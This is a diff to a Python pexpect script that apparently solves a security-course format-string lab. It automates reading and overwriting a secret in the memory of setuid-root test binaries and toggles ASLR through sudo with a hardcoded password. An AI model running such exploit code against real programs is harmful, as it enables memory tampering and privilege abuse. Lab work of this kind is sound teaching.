@@ -1,6 +1,6 @@
 import pexpect, os, sys, tty
 
-FILE = ""
+FILENAME = ""
 
 # Spawn piped process of updated formatstring program
 def spawnProcess(FILE):
@@ -28,7 +28,7 @@ def writeHexFile(p, address):
     fwrite = open('file.hex', 'w')
     fwrite.write(s)
     fwrite.close()
-    pexpect.run('xxd -p -r file.hex > file')
+    #pexpect.run('xxd -p -r file.hex > file')
     pexpect.run("hexDump.sh")
 
 def readHexFile():
@@ -37,6 +37,15 @@ def readHexFile():
     data = fread.read()
     fread.close()
     return data
+    
+def checkAddress(address):
+    addr = [address[0:2], address[2:4], address[4:6], address[6:8]]
+    invalids = ["00", "0C", "0A", "0D", "09", "20"]
+    if any(elem in addr for elem in invalids):
+        print "Certain control characters (00, 0C, 0A, 0D, 09, 08, etc) can be invalid. Retrying."
+        return False
+    else:
+        return True
 
 def readFromAddress(p, address, data):
     # Set file descriptor to take raw input (allows command hex codes)
@@ -62,17 +71,16 @@ def readFromAddress(p, address, data):
     # Output remaining
     output = p.read()
     print output
-
-    # Extract secret from format string echo
-    secret = output[index]
-    print "secret[1] is: " + secret
-    print "In hex: 0x" + secret.encode("hex_codec")
     
-    if (secret != 'U'):
-        print "Certain control characters (00, 0C, 0A, 0D, 09, etc) are invalid."
-        sys.exit(0)
-
     p.close()
+
+    if checkAddress(address):
+        secret = output[index]
+        print "secret[1] is: " + secret
+        print "In hex: 0x" + secret.encode("hex_codec")
+        return True
+    else:
+        return False
     
 def writeToAddress(p, address, data, writeData):
     # Set file descriptor to take raw input (allows command hex codes)
@@ -105,50 +113,65 @@ def writeToAddress(p, address, data, writeData):
     # Output remaining
     output = p.read()
     print output
-    
     p.close()
+    
+    if checkAddress(address):
+        return True
+    else:
+        return False
+    
+    
+    
 
-def readSecret():
+def readSecret(FILE):
     p = spawnProcess(FILE)
     address = extractAddress(p)
     writeHexFile(p, address)
     data = readHexFile()
-    readFromAddress(p, address, data)
+    if readFromAddress(p, address, data) == False:
+        readSecret(FILE)
 
-def writeSecret(writeData):
+def writeSecret(FILE, writeData):
     p = spawnProcess(FILE)
     address = extractAddress(p)
     writeHexFile(p, address)
     data = readHexFile()
-    writeToAddress(p, address, data, writeData)
+    if writeToAddress(p, address, data, writeData) == False:
+        writeSecret(FILE, writeData)
      
 ###
-FILE = "./formatstr-root"
+FILENAME = "./formatstr-root"
 
-aslr = pexpect.run("echo 'dees' | sudo -kS sysctl -w kernel.randomize_va_space=2")
-print "[ASLR On]: "+aslr
+#aslr = pexpect.run("echo 'dees' | sudo -kS sysctl -w kernel.randomize_va_space=2")
+#print "[ASLR On]: "+aslr
 
 print "[TASK 1b]: Reading from address using previous input"
-readSecret()
+raw_input("Press Enter to continue...")
+readSecret(FILENAME)
 print "[TASK 1c & d]: Writing to address using previous input"
-writeSecret(400)
+raw_input("Press Enter to continue...")
+writeSecret(FILENAME, 400)
 
 ###
-FILE = "./formatstr-root2"
+FILENAME = "./formatstr-root2"
 
-aslr = pexpect.run("echo 'dees' | sudo -kS sysctl -w kernel.randomize_va_space=0")
-print "[ASLR OFF]: "+aslr
+#aslr = pexpect.run("echo 'dees' | sudo -kS sysctl -w kernel.randomize_va_space=0")
+#print "[ASLR OFF]: "+aslr
 
 print "[TASK 2b]: Reading from address using input string without ASLR"
-readSecret()
+raw_input("Press Enter to continue...")
+readSecret(FILENAME)
 print "[TASK 2c & 2d]: Writing to address using input string without ASLR"
-writeSecret(400)
+raw_input("Press Enter to continue...")
+writeSecret(FILENAME, 400)
 
 ###
-aslr = pexpect.run("echo 'dees' | sudo -kS sysctl -w kernel.randomize_va_space=2")
-print "[ASLR On]: "+aslr
+#aslr = pexpect.run("echo 'dees' | sudo -kS sysctl -w kernel.randomize_va_space=2")
+#print "[ASLR On]: "+aslr
 
 print "[TASK 3b]: Reading from address using input string with ASLR"
-readSecret()
+raw_input("Press Enter to continue...")
+readSecret(FILENAME)
 print "[TASK 3c & 3d]: Writing to address using input string with ASLR"
-writeSecret(400)
+raw_input("Press Enter to continue...")
+writeSecret(FILENAME, 400)
